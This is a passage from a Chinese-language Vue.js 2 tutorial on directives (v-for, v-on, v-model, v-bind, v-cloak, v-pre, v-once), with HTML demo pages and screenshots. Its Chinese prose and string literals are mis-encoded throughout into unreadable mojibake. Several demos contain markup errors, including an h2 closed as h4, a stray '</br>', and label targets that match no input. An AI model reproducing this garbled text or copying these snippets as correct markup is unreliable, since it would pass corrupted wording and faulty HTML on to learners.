<p>æ¯”å¦‚ä¸Šè¿°ä¾‹å­æˆ‘ä»¬å¯ä»¥æ”¹æˆå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(val, key, index) in listObj"</span>&gt;</span>{{ index }}{{ val.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">listObj</span>: {
        	<span class="hljs-attr">hong</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°çº¢'</span>
          },
          <span class="hljs-attr">ming</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ˜'</span>
          },
          <span class="hljs-attr">zhi</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ™º'</span>
          },
          <span class="hljs-attr">gang</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°åˆš'</span>
          }
        }
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7">v-on</h4>
<p><code>v-on</code>Â å°±æ˜¯ç›‘å¬äº‹ä»¶ï¼Œå¯ä»¥ç”¨Â <code>v-on</code>Â æŒ‡ä»¤ç›‘å¬ DOM äº‹ä»¶æ¥è§¦å‘ä¸€äº›æ–¹æ³•å‡½æ•°ã€‚</p>
<p><code>v-on</code>Â æœ‰ä¸€ç§ç®€å†™å½¢å¼ï¼Œç”¨ @ ç¬¦å·ä»£æ›¿ã€‚å®ƒè¿˜èƒ½ç›‘å¬ä¸€äº›é”®ç›˜äº‹ä»¶ï¼Œå¦‚é”®ç›˜çš„å›è½¦é”®Â <code>v-on:keyup.enter</code>Â ç­‰ï¼Œå¤§å®¶å¯ä»¥ç±»æ¨å…¶ä»–çš„é”®ç›˜äº‹ä»¶ã€‚</p>
<p>ä¸‹é¢å°±æ¥çœ‹çœ‹ä»£ç ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ•°å­—ï¼š{{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">"add"</span>&gt;</span>åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">v-on:keyup.enter</span>=<span class="hljs-string">"login"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">count</span>: <span class="hljs-number">1</span>,
        <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>
      },
      <span class="hljs-attr">methods</span>: {
        <span class="hljs-attr">add</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> ++
        },
        <span class="hljs-attr">login</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span>)
        }
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f031fd0d99b146369a558313311f4c87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=FYHlNV8sCr74i1DvZSUwgQohRZs%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>é”®ç›˜äº‹ä»¶ä¸€èˆ¬ç”¨ä½œè¾“å…¥æ¡†ï¼Œç”¨æˆ·åæˆ–å¯†ç çš„è¾“å…¥å›è½¦äº‹ä»¶ç›‘å¬ã€‚</p>
</blockquote>
<h4 data-id="heading-8">v-model</h4>
<p>åœ¨ Vue çš„ä¼—å¤šæŒ‡ä»¤é‡Œï¼Œ<code>v-model</code>Â ç®—æ˜¯ä¸¾è¶³è½»é‡çš„ï¼Œå› ä¸ºå®ƒçš„åŒå‘ç»‘å®šç‰¹æ€§ï¼Œèƒ½è§£å†³å¾ˆå¤šä¸šåŠ¡ä¸Šçš„å¤æ‚éœ€æ±‚ï¼Œä¸‹é¢å°±ç”¨å‡ ä¸ªå°ç¤ºä¾‹æ¥è¯ é‡Šå®ƒçš„å¼ºå¤§ï¼Œä»£ç æ¼”ç¤ºå¦‚ä¸‹ï¼š</p>
<p>1ã€æœ€ç®€å•çš„åŒå‘ç»‘å®š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç”¨æˆ·åï¼š{{ username }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/776ede7941794a5a855c339d94f12794~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=treaT4rVcvoVF9AaSZx7xeqAChQ%3D" alt="" loading="lazy"/></p>
<p>2ã€ç»“åˆå¤é€‰æ¡†</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>checkbox<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"apple"</span>&gt;</span>è‹¹æœ<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"fruit.apple"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"apple"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"banana"</span>&gt;</span>é¦™è•‰<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"fruit.banana"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"banana"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
    {{ fruit }}
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">fruit</span>: {
          <span class="hljs-attr">apple</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">banana</span>: <span class="hljs-literal">false</span>
        }
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8616e7118128410586e3a13b192346a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=KRdTaYSz11Q7lZg9t7Hv5D%2B5Uro%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ç»“åˆå¤é€‰æ¡†å®ç°åˆ‡æ¢å¤é€‰æ¡†å†…çš„å€¼ï¼ŒåŠ¨æ€åœ°æ”¹å˜æ•°æ®ã€‚</p>
</blockquote>
<p>3ã€ç»“åˆå•é€‰æ¡†</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>radio<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"apple"</span>&gt;</span>ç”·<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"ç”·"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"banana"</span>&gt;</span>å¥³<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"å¥³"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
    {{ sex }}
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">sex</span>: <span class="hljs-string">'ç”·'</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8cce66afea241ce959a8dcbea25a2eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=87We%2FJX7EhvJuKXuRXMfy66qCko%3D" alt="" loading="lazy"/></p>
<p>4ã€å‡ ä¸ªéœ€è¦æ³¨æ„çš„ä¿®é¥°ç¬¦</p>
<ul>
<li>.lazyï¼šæ¥ç®¡ input çš„äº‹ä»¶ç›‘å¬äº‹ä»¶ï¼Œè¾“å…¥çš„æ—¶å€™ä¸ä¼šé©¬ä¸Šå“åº”åœ¨å±•ç¤ºå±‚ï¼Œå½“æ•°æ®ç¡®è®¤æ”¹å˜çš„æ—¶å€™æ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼›</li>
<li>.trimï¼šå»æ‰é¦–å°¾çš„ç©ºæ ¼ï¼Œä¸ä¼šå»é™¤ä¸­é—´çš„ç©ºæ ¼ï¼›</li>
<li>.numberï¼šè¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼›</li>
</ul>
<h4 data-id="heading-9">v-bind</h4>
<p>å¯¹å˜é‡å±æ€§çš„ä¸€ä¸ªç»‘å®šï¼Œæ¯”å¦‚è¯´éœ€è¦ç»‘å®šä¸€ä¸ªå›¾ç‰‡åªéœ€å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;img v-bind:<span class="hljs-attr">src</span>=<span class="hljs-string">"imageSrc"</span>&gt;
// å¯ç®€å†™ä¸º
&lt;img :<span class="hljs-attr">src</span>=<span class="hljs-string">"imageSrc"</span>&gt;
</code></pre>
<p>ç»‘å®š CSS æ ·å¼ï¼Œä¸€èˆ¬ç”¨åœ¨éœ€è¦è®¡ç®—è¡¨è¾¾å¼çš„æ—¶å€™ä½¿ç”¨</p>
<pre><code class="hljs language-csharp" lang="csharp">&lt;div :<span class="hljs-keyword">class</span>=<span class="hljs-string">"className"</span>&gt;ç»‘å®š<span class="hljs-keyword">class</span>&lt;/<span class="hljs-title">div</span>&gt;
<span class="hljs-comment">// åˆ¤æ–­å˜é‡</span>
&lt;<span class="hljs-title">div</span> :<span class="hljs-title">class</span>="{<span class="hljs-title">classA</span>: <span class="hljs-title">isShow</span>}"&gt;ç»‘å®š<span class="hljs-keyword">class</span>ä¸­çš„åˆ¤æ–­&lt;/<span class="hljs-title">div</span>&gt;
<span class="hljs-comment">// ä¸‰å…ƒè¿ç®—ç¬¦</span>
&lt;<span class="hljs-title">div</span> :<span class="hljs-title">class</span>="<span class="hljs-title">isShow</span> ? <span class="hljs-title">classA</span> : <span class="hljs-title">classB</span>"&gt;ç»‘å®š<span class="hljs-keyword">class</span>ä¸­çš„ä¸‰å…ƒè¡¨è¾¾å¼åˆ¤æ–­&lt;/<span class="hljs-title">div</span>&gt;
<span class="hljs-comment">// ç»‘å®š style</span>
&lt;<span class="hljs-title">div</span> :<span class="hljs-title">style</span>="{<span class="hljs-title">color</span>: <span class="hljs-title">blue</span>, <span class="hljs-title">fontSize</span>: <span class="hljs-title">font</span>}"&gt;ç»‘å®š<span class="hljs-title">style</span>&lt;/<span class="hljs-title">div</span>&gt;
</code></pre>
<h4 data-id="heading-10">v-cloak</h4>
<p>ä½œç”¨ï¼šè¿™ä¸ªæŒ‡ä»¤ä¿æŒåœ¨å…ƒç´ ä¸Šç›´åˆ°å…³è”å®ä¾‹ç»“æŸç¼–è¯‘ã€‚å’Œ CSS è§„åˆ™å¦‚Â <code>[v-cloak] { display: none }</code>Â ä¸€èµ·ç”¨æ—¶ï¼Œè¿™ä¸ªæŒ‡ä»¤å¯ä»¥éšè—æœªç¼–è¯‘çš„ Mustache æ ‡ç­¾ç›´åˆ°å®ä¾‹å‡†å¤‡å®Œæ¯•ã€‚<a href="https://link.juejin.cn/?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fapi%2F%23v-cloak" title="https://link.juejin.cn/?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fapi%2F%23v-cloak" target="_blank">å®˜æ–¹API</a>Â ã€‚</p>
<p>ä½¿ç”¨åœºæ™¯ï¼šç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°ï¼Œåœ¨ä»‹ç»Â <code>v-model</code>Â çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ª demo å‡ºç°äº†åŒå¤§æ‹¬å·é—ªçƒçš„é—®é¢˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65542e9af1d14dd881350f3612b12e7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=4VZyi7R%2ByVsSkUDmF0ZiIwHWqeI%3D" alt="" loading="lazy"/></p>
<p><strong>è§£å†³æ–¹æ³•ï¼š</strong></p>
<p>åœ¨ CSS ä¸­åŠ ä¸Šå¦‚ä¸‹å±æ€§ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[v-cloak]</span> {
  <span class="hljs-attribute">display</span>: none;
}
</code></pre>
<p>åœ¨ç»‘å®šçš„å˜é‡çš„èŠ‚ç‚¹ä¸ŠåŠ ä¸Š v-cloak</p>
<pre><code class="hljs language-bash" lang="bash">&lt;div <span class="hljs-built_in">id</span>=<span class="hljs-string">"app"</span> v-cloak&gt;
  {{msg}}
&lt;/div&gt;
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šVue 1.x å’Œ Vue 2.x ä¸­ v-cloak çš„ç”¨æ³•æ˜¯ä¸åŒçš„ã€‚Vue1.x ä¸­ï¼Œå…è®¸å°† Vue å®ä¾‹æŒ‚è½½åœ¨ body ä¸Šï¼Œè€Œ Vue2.x æ˜¯ä¸å…è®¸çš„ï¼Œæƒ³å¯¹æ•´ä¸ªé¡µé¢å®ä¾‹åŒ–ï¼Œéœ€è¦å¦å¤–ç”¨ä¸€ä¸ª div æ¥å®¹çº³æ•´ä¸ªé¡µé¢å†…å®¹ï¼Œå¯¹å…¶è¿›è¡Œå®ä¾‹åŒ–ã€‚</p>
</blockquote>
<p>è¯•æƒ³ç”¨æˆ·æ‰“å¼€ç½‘é¡µï¼Œé—ªè¿‡ä¸€ç‰‡Â <code>{{parmas}}</code>Â ï¼Œä¸èµ·çœ¼çš„å°æŒ‡ä»¤ï¼Œå´æå¤§çš„ä¼˜åŒ–äº†ç½‘é¡µçš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h4 data-id="heading-11">v-pre</h4>
<p>ç›´æ¥è·³è¿‡ Vue çš„ç¼–è¯‘ï¼Œè¾“å‡ºåŸå§‹å€¼ã€‚åœ¨æ ‡ç­¾ä¸­å¦‚ä¸‹ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-css" lang="css">&lt;<span class="hljs-selector-tag">div</span> v-pre&gt;{{message}}&lt;/<span class="hljs-selector-tag">div</span>&gt;
</code></pre>
<p>æœ€ç»ˆåœ¨ç½‘é¡µä¸Šè¾“å‡ºçš„ç»“æœæ˜¯Â <code>{{message}}</code>ã€‚</p>
<h4 data-id="heading-12">v-once</h4>
<p>åªåœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“æ—¶æ‰§è¡Œï¼Œä¹‹åçš„æ“ä½œéƒ½è¢«è§†ä¸ºé™æ€å†…å®¹ï¼Œè·³å‡ºä¹‹åçš„æ‰€æœ‰æ¸²æŸ“è¿‡ç¨‹ã€‚</p>
